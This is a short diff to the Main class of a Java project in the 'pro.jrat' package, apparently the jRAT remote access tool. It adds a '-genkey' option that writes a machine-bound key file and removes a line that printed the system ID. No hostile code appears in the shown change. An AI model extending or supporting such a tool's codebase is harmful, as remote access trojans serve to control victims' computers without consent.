@@ -1,6 +1,7 @@
 package pro.jrat;
 
 import java.io.File;
+import java.io.FileOutputStream;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -31,9 +32,21 @@ public class Main {
 
 	public static boolean debug;
 	public static Frame instance;
+	public static byte[] key;
 
 	public static void main(String[] args) throws Exception {
-		System.out.println("System Unique ID: " + UniqueId.getTextual());
+		if (argsContains(args, "-genkey")) {
+			System.out.println("Generating system key");
+			File file = new File("jrat.key");
+			FileOutputStream out = new FileOutputStream(file);
+			out.write(UniqueId.generateBinary());
+			out.close();
+			System.out.println("Wrote key to jrat.key");
+			return;
+		} else {
+			
+		}
+		
 		debug = argsContains(args, "-debug");
 		
 		if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
